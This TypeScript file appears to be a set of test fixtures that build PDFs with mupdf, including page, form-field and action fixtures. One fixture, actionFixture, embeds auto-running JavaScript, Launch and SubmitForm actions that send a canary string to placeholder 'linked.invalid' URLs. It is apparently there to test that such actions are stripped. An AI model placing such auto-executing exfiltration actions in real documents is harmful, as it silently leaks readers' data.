import * as mupdf from 'mupdf'
import type { Rect } from '../src/model/document'

export function fixture(options: { rotation?: mupdf.Rotate; crop?: Rect; userUnit?: number; extra?: string; content?: string; pages?: number; sharedForm?: boolean; annotation?: 'Link' | 'Redact' } = {}) {
  const doc = new mupdf.PDFDocument()
  const font = new mupdf.Font('Helvetica')
  try {
    const ref = doc.addSimpleFont(font)
    const content = options.content ?? `q 0.9 0.95 1 rg 70 345 230 45 re f Q
BT /F 20 Tf 1 0 0 1 80 360 Tm (Original editable line) Tj ET
BT /F 12 Tf 1 0 0 1 80 300 Tm (Nearby content stays.) Tj ET
${options.extra ?? ''}`
    const form = options.sharedForm ? doc.addStream(content, { Type: 'XObject', Subtype: 'Form', BBox: [0, 0, 400, 500], Resources: { Font: { F: ref } } }) : undefined
    for (let i = 0; i < (options.pages ?? 1); i++) {
      const page = doc.addPage([0, 0, 400, 500], options.rotation ?? 0, form ? { XObject: { Shared: form } } : { Font: { F: ref } }, form ? 'q /Shared Do Q' : content)
      if (options.crop) page.put('CropBox', options.crop)
      if (options.userUnit) page.put('UserUnit', options.userUnit)
      doc.insertPage(-1, page); page.destroy()
    }
    if (options.annotation) {
      const page = doc.loadPage(0)
      if (options.annotation === 'Link') {
        const link = page.createLink([80, 120, 280, 210], 'https://example.invalid') // spans two lines: editing keeps it in place
        link.destroy()
      } else {
        const annotation = page.createAnnotation('Redact'); annotation.setRect([10, 10, 20, 20]); annotation.destroy()
      }
      page.destroy()
    }
    const bytes = doc.saveToBuffer('garbage=4,compress')
    try { return bytes.asUint8Array().slice() } finally { bytes.destroy() }
  } finally { font.destroy(); doc.destroy() }
}

export function actionFixture(){
 const doc=new mupdf.PDFDocument(fixture({extra:'BT /F 10 Tf 1 0 0 1 80 200 Tm (MARGIN_PRIVATE_CANARY extracted content) Tj ET'}));doc.disableJS();const trailer=doc.getTrailer(),root=trailer.get('Root')
 const js=doc.newString("app.launchURL('https://linked.invalid/collect?MARGIN_PRIVATE_CANARY');this.submitForm('https://linked.invalid/form');")
 const uri=doc.newString('https://linked.invalid/remote?MARGIN_PRIVATE_CANARY')
 const action=doc.addObject({S:'JavaScript',JS:js}),actionName=doc.newString('automatic')
 try{
  root.put('OpenAction',action);root.put('AA',{WC:action,WP:{S:'SubmitForm',F:uri}})
  root.put('Names',{JavaScript:{Names:[actionName,action]}})
  const page=doc.loadPage(0),object=page.getObject()
  try{object.put('AA',{O:action,C:{S:'Launch',F:uri}});const link=page.createLink([10,10,60,30],'https://linked.invalid/click?MARGIN_PRIVATE_CANARY');link.destroy()}finally{object.destroy();page.destroy()}
  const buffer=doc.saveToBuffer('garbage=4,compress');try{return buffer.asUint8Array().slice()}finally{buffer.destroy()}
 }finally{actionName.destroy();action.destroy();js.destroy();uri.destroy();root.destroy();trailer.destroy();doc.destroy()}
}

// Text, checkbox, combo box and a two-button radio group on page 1.
export function formFixture(){
 const doc=new mupdf.PDFDocument(fixture({pages:2}))
 try{
  const ap=(on:string)=>({N:{[on]:doc.addStream('0 g 2 2 8 8 re f',{BBox:[0,0,12,12]}),Off:doc.addStream('',{BBox:[0,0,12,12]})}})
  const page=doc.findPage(0),fields=doc.newArray(),annots=doc.newArray()
  const add=(dict:Record<string,unknown>)=>{const widget=doc.addObject({Type:'Annot',Subtype:'Widget',P:page,F:4,...dict});fields.push(widget);annots.push(widget);return widget}
  add({FT:'Tx',T:doc.newString('name'),Rect:[80,420,300,440],DA:doc.newString('/Helv 12 Tf 0 g'),MaxLen:40})
  add({FT:'Btn',T:doc.newString('agree'),Rect:[80,390,92,402],AP:ap('Yes'),AS:'Off',V:'Off'})
  add({FT:'Ch',Ff:131072,T:doc.newString('country'),Rect:[80,350,300,370],DA:doc.newString('/Helv 12 Tf 0 g'),Opt:[doc.newString('India'),doc.newString('Norway')]})
  const group=doc.addObject({FT:'Btn',Ff:49152,T:doc.newString('size'),V:'Off',Kids:[]})
  for(const [i,on] of ['S','L'].entries()){const kid=doc.addObject({Type:'Annot',Subtype:'Widget',P:page,F:4,Parent:group,Rect:[80+i*30,320,92+i*30,332],AP:ap(on),AS:'Off'});group.get('Kids').push(kid);annots.push(kid)}
  fields.push(group)
  page.put('Annots',annots)
  const root=doc.getTrailer().get('Root');root.put('AcroForm',{Fields:fields,DA:doc.newString('/Helv 12 Tf 0 g'),DR:{Font:{Helv:doc.addObject({Type:'Font',Subtype:'Type1',BaseFont:'Helvetica'})}}})
  const b=doc.saveToBuffer('garbage=4,compress');try{return b.asUint8Array().slice()}finally{b.destroy()}
 }finally{doc.destroy()}
}
